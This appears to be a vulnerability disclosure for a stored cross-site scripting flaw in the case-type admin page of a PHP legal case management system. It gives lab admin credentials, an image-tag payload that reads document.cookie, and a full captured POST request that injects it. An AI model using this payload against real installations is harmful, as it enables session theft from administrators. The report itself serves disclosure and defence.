## Legal Case Management System

## XSS on `/admin/case-type`

### Vendor Homepage:

```
https://www.campcodes.com/projects/php/legal-case-management-system/
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://192.168.150.131/admin/login
superadmin@gmail.com
12345678Ab@
```

### Affected Page:

```
/admin/case-type
```

The parameter `case_type_name` is being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

### Proof of Concept:

Payload:

```
<img src=1 onerror="alert(document.cookie)">
```

Burp Request:

```
POST /admin/case-type HTTP/1.1
Host: 192.168.150.131
Content-Length: 418
Accept: */*
DNT: 1
X-CSRF-TOKEN: ULMyHyzFjMsFtMuhHe7fZNzX3Wzq3QzrNCAeTRLy
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryng2URRlpRpThmd3E
Origin: http://192.168.150.131
Referer: http://192.168.150.131/admin/case-type
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: XSRF-TOKEN=eyJpdiI6InlkbjdNODVsNWVOMGdrRTkyR3V1QXc9PSIsInZhbHVlIjoiNjNpZWU1NjJtYzhkWFJMNlwvRHVpbXM0MkpneVA4dnpjcllhQk5zWUxBS055a3dzQkgzdDN4cmZPcVlGQlRVcTgiLCJtYWMiOiJkOWZlMjgxOWJmYTYzOWVhODhmYjJlMjJlZjllNDBmMDlhNDMxNmI3MWZlYTU2ZGYxN2M5ZjNmYjk5ZDBiY2MwIn0%3D; test_session=eyJpdiI6InZSM0FVQU9RRUxXTkx5SkgrRHVJTFE9PSIsInZhbHVlIjoicmlMZXhNdDI3WWJWRUYySUVxc05DQVkyaklhNFh0UWxmVkdIbUlnblNXbTltS0lLcDRsbEU2SThqTzdRcmEyVSIsIm1hYyI6IjFiMjc0YTI2N2NkMWIzYWQ2YmVmNzYzZjU4NzA2NGJhNTAzYTZkYzJmODU3ZjIxNjEwMjNjMjBmZjIxMjAzMTAifQ%3D%3D
Connection: close

------WebKitFormBoundaryng2URRlpRpThmd3E
Content-Disposition: form-data; name="_token"

ULMyHyzFjMsFtMuhHe7fZNzX3Wzq3QzrNCAeTRLy
------WebKitFormBoundaryng2URRlpRpThmd3E
Content-Disposition: form-data; name="case_type"


------WebKitFormBoundaryng2URRlpRpThmd3E
Content-Disposition: form-data; name="case_type_name"

<img src=1 onerror="alert(document.cookie)">
------WebKitFormBoundaryng2URRlpRpThmd3E--

```

### Screenshot

![image-20240509195753854](./screenshot/image-20240509195753854.png)
